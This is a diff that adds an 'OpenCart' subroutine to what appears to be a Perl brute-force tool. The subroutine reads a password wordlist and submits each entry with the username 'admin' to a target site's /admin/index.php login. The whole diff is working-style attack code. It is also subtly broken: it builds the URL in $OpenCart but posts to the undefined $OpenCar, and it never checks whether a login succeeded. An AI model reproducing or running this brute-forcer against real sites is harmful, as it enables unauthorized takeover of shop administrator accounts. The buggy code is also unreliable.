@@ -375,3 +375,27 @@ next OUTER;
 }
 }
 }
+
+##### OpenCar #####
+sub opencart{
+print color('bold red'),"\n [";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$ocuser = admin;
+$ocpass = $_;
+print color('bold red'),"\n [";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $ocpass";
+$OpenCart= $site  . '/admin/index.php';
+
+$ocbrute = POST $OpenCar, [username => $ocuser, password => $ocpass,];
+$response = $ua->request($ocbrute);
+$stat = $response->status_line;
+}
+
+}
